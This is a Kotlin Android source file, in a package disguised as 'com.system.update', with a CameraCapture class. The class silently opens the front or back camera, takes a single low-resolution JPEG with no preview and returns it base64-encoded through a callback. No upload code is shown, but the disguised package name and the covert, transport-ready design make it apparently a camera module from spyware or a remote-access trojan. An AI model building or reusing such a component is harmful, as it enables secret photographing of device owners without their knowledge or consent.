package com.system.update

import android.content.Context
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import android.util.Base64
import android.util.Log
import android.util.Size
import java.nio.ByteBuffer

class CameraCapture(private val ctx: Context) {

    companion object {
        private const val TAG = "CameraCapture"
    }

    fun capture(front: Boolean, callback: (String?) -> Unit) {
        val cm = ctx.getSystemService(Context.CAMERA_SERVICE) as CameraManager
        val targetFacing = if (front) CameraCharacteristics.LENS_FACING_FRONT
                           else CameraCharacteristics.LENS_FACING_BACK

        val cameraId = try {
            cm.cameraIdList.firstOrNull { id ->
                cm.getCameraCharacteristics(id).get(CameraCharacteristics.LENS_FACING) == targetFacing
            } ?: cm.cameraIdList.firstOrNull()
        } catch (e: Exception) {
            Log.e(TAG, "Failed to get camera list", e)
            null
        }

        if (cameraId == null) {
            callback(null)
            return
        }

        val thread = HandlerThread("cam_$cameraId").also { it.start() }
        val handler = Handler(thread.looper)

        try {
            val chars = cm.getCameraCharacteristics(cameraId)
            val map = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
            val size = map?.getOutputSizes(ImageFormat.JPEG)?.minByOrNull { it.width * it.height }
                ?: Size(640, 480)

            val reader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 1)

            var cameraDevice: CameraDevice? = null
            var session: CameraCaptureSession? = null

            reader.setOnImageAvailableListener({ r ->
                val image = try { r.acquireLatestImage() } catch (_: Exception) { null }
                if (image != null) {
                    try {
                        val buf: ByteBuffer = image.planes[0].buffer
                        val bytes = ByteArray(buf.remaining())
                        buf.get(bytes)
                        val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                        callback(b64)
                    } catch (e: Exception) {
                        Log.e(TAG, "Encode failed", e)
                        callback(null)
                    } finally {
                        image.close()
                        try { session?.close() } catch (_: Exception) {}
                        try { cameraDevice?.close() } catch (_: Exception) {}
                        try { r.close() } catch (_: Exception) {}
                        thread.quitSafely()
                    }
                }
            }, handler)

            cm.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    cameraDevice = camera
                    try {
                        val req = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                            addTarget(reader.surface)
                            set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO)
                            set(CaptureRequest.JPEG_QUALITY, 85.toByte())
                        }
                        camera.createCaptureSession(
                            listOf(reader.surface),
                            object : CameraCaptureSession.StateCallback() {
                                override fun onConfigured(s: CameraCaptureSession) {
                                    session = s
                                    try {
                                        s.capture(req.build(), null, handler)
                                    } catch (e: Exception) {
                                        Log.e(TAG, "Capture failed", e)
                                        callback(null)
                                    }
                                }
                                override fun onConfigureFailed(s: CameraCaptureSession) {
                                    Log.e(TAG, "Session config failed")
                                    callback(null)
                                }
                            },
                            handler
                        )
                    } catch (e: Exception) {
                        Log.e(TAG, "Capture request failed", e)
                        callback(null)
                    }
                }
                override fun onDisconnected(camera: CameraDevice) {
                    camera.close()
                    callback(null)
                }
                override fun onError(camera: CameraDevice, error: Int) {
                    Log.e(TAG, "Camera error: $error")
                    camera.close()
                    callback(null)
                }
            }, handler)
        } catch (e: Exception) {
            Log.e(TAG, "Setup failed", e)
            callback(null)
        }
    }
}
